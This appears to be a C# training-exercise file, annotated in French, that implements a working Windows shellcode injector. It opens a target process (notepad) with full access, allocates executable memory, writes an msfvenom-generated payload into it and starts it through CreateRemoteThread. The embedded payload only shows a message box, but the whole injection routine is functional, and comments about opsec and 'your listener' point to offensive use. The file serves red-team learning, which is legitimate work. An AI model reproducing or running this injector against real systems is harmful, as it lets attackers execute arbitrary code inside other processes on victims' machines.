using System;
//Fournit des classes permettant de démarrer et gérer des processus windows
using System.Diagnostics;
//Permet l'interopérabilité entre le .NetPipeStyleUriParser et les API Windows
using System.Runtime.InteropServices;

namespace Injector
{
    public class BasicShellcodeInjector
    {
        //Cet exercice est en fait très similaire à l'Exercice 1 en termes de mise en oeuvre.
        //L'approche de base est comparable à la méthode VirtualAlloc() que nous avons vue précédemment,
        //sauf que cette fois-ci nous utilisons une combinaison d'API différente : OpenProcess() pour obtenir un handle sur le processus cible,
        //VirtualAllocEx() pour allouer de la mémoire exécutable dans le processus distant, WriteProcessMemory() pour copier le shellcode 
        //dans la mémoire allouée, et CreateRemoteThread() pour exécuter le shellcode en tant que partie du processus cible.

        // More P/Invoke definitions!
        // Enums modified to only include relevant options

        // https://pinvoke.net/default.aspx/kernel32/OpenProcess.html
        // Enumeration  qui represente les droits d'acces à un processus
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            //Acces complet au processus
            All = 0x001F0FFF
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        //iport de la fonction OpenProcess depuis kernel 32
        //OpenProcess permet d'obtenir un handle vers un processus existant
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        // https://pinvoke.net/default.aspx/kernel32/VirtualAllocEx.html
        //Definition  des types d'allocation mémoire possible
        //utilisé par VirtualAlloEx
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }
        //Definition des permissions de mémoire
        //lecture, ecriture, execution
        [Flags]
        public enum MemoryProtection
        {
            //Memoire executable et modifiable ?
            ExecuteReadWrite = 0x40
        }
        //import de la fonction VirtualAlloxEx
        //Permet d'allouer de la memoire dans un processus distant
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        // https://pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        //Import de la fonction WriteProcessMemory
        //Permet d'ecrire des données dans la mémoire d'un processus distant
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] lpscfer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // https://pinvoke.net/default.aspx/kernel32/CreateRemoteThread.html
        //Permet de crer un thread dans un processus distant
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        //point d'entree princiapl du programme
        public static void Main()
        {

            // Define our shellcode as a csharp byte array
            //msfvenom -p windows/x64/messagebox TEXT='Task failed successfully!' TITLE='Error!' -f csharp --> j'ai obtenu ce code via kali linux
            byte[] sc = new byte[318] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,
            0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
            0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
            0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
            0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
            0x41,0x51,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
            0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
            0x67,0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
            0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
            0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,
            0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
            0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
            0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0xe8,0x1a,0x00,0x00,0x00,0x54,0x61,0x73,
            0x6b,0x20,0x66,0x61,0x69,0x6c,0x65,0x64,0x20,0x73,0x75,0x63,
            0x63,0x65,0x73,0x73,0x66,0x75,0x6c,0x6c,0x79,0x21,0x00,0x5a,
            0xe8,0x07,0x00,0x00,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
            0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5};

            // stockd en octet le payload 
            int len = sc.Length;

            // Definit le nom du processus cible
            string targetProc = "notepad";

            // Get a list of processes matching the target name
            Process[] expProc = Process.GetProcessesByName(targetProc);
            if(expProc.Length == 0){ 
                Console.WriteLine($"No {targetProc} found. Is it running?");
                return;
             }

            // Resolve the Process ID (PID) of the target
            //recuperation du PID
            int pid = expProc[0].Id;
            Console.WriteLine($"Target process: {targetProc} [{pid}].");

            // Get a handle on the target process in order to interact with it
            //ouverture du processus
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);
            if ((int)procHandle == 0)
            {
                Console.WriteLine($"Failed to get handle on PID {pid}. Do you have the right privileges?");
                return;
            } else {
                Console.WriteLine($"Got handle {procHandle} on target process.");
            }

            //Alloue une zone mémoire dans l'espace d'adressage du processus cible
            //Cette mémoire est reservée et, lisible, inscriptible et executable
            // Allocate RWX memory in the remote process
            // The opsec note from exercise 1 is applicable here, too
            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, 
                MemoryProtection.ExecuteReadWrite);
            Console.WriteLine($"Allocated {len} bytes at address {memAddr} in remote process.");

            // Write the payload to the allocated bytes in the remote process
            //ecriture des données dans la mémoire distante
            IntPtr bytesWritten;
            bool procMemResult = WriteProcessMemory(procHandle, memAddr, sc, len, out bytesWritten);
            //copie du contenu du tableau sc dans la mémoire precedemment allouée du processus distant
            if(procMemResult){
                Console.WriteLine($"Wrote {bytesWritten} bytes.");
             } else {
                Console.WriteLine("Failed to write to remote process.");
             }

            // cree un thread dans le processus distant dont le point d'entree correspond à l'adresse mémoire précedemment allouée
            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"Created remote thread at {tAddr}. Check your listener!");

        }
    }
}